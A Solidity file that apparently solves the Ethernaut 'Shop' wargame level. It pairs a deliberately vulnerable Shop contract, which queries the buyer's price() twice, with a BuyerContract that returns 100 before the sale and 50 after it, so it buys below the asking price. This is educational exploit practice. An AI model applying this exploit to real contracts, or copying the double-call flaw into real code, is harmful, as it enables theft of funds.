// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}

contract BuyerContract {
    Shop shop;

    constructor(address _shop) public {
        shop = Shop(_shop);
    }

    function price() external view returns (uint256) {
        bool sold = shop.isSold();
        // 50 if it's sold to get a lower price
        return sold ? 50 : 100;
    }

    function buy() external {
        shop.buy();
    }
}
